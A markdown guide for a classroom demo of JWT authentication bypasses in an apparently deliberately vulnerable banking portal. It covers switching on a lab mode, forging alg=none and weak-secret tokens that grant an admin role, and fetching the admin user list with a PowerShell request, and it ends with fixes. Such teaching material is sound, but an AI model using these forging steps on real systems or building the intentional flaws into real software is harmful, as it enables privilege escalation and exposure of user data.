# JWT bypass — security presentation guide

**Warning:** These flaws are intentional for classroom demos only.  
Set `SECURITY_LAB_MODE=true` only during your presentation, then turn it off.

## Enable lab mode

**Local:**

```powershell
cd backend
$env:SECURITY_LAB_MODE = "true"
.\win_env\Scripts\python.exe -m uvicorn app.main:app --host 127.0.0.1 --port 8000
```

**Render:** Dashboard → **kiis-bank-portal** service → **Environment** → add:

| Key | Value |
|-----|--------|
| `SECURITY_LAB_MODE` | `true` |

Redeploy, then disable after the presentation.

## Presentation flow (5 minutes)

### 1. Show normal security

- Log in as **Jane Doe** / `customer123`
- Call `GET /api/admin/users` with her token → **403 Forbidden**

### 2. Explain JWT structure

- Show token from login (jwt.io): header `alg: HS256`, payload `sub`, `role`

### 3. Exploit — alg=none bypass

Open in browser (lab mode on):

```
GET /api/lab/forge-token/none?username=Jane%20Doe&role=admin
```

Copy `token` from JSON.

```powershell
$token = "<paste token>"
Invoke-WebRequest -Uri "https://kiis-bank-portal.onrender.com/api/admin/users" `
  -Headers @{ Authorization = "Bearer $token" }
```

→ **200** with full user list (privilege escalation).

### 4. What you are demonstrating

| Vulnerability | What broke |
|---------------|------------|
| **alg=none** | Server accepts unsigned JWT |
| **Weak secret** | `/api/lab/forge-token/weak-secret` |
| **Trust role in token** | Customer username + `role: admin` in payload |

### 5. Fix (slide)

- Reject `alg=none`, whitelist algorithms
- Never trust `role` from JWT; load from database only
- Strong `SECRET_KEY`, short expiry, rotate keys

## Lab API (only when `SECURITY_LAB_MODE=true`)

| Endpoint | Purpose |
|----------|---------|
| `GET /api/lab/status` | Confirms lab mode |
| `GET /api/lab/forge-token/none?username=Jane%20Doe&role=admin` | Forged unsigned token |
| `GET /api/lab/forge-token/weak-secret?username=Jane%20Doe&role=admin` | Weak-key signed token |

When lab mode is **off**, these return **404**.
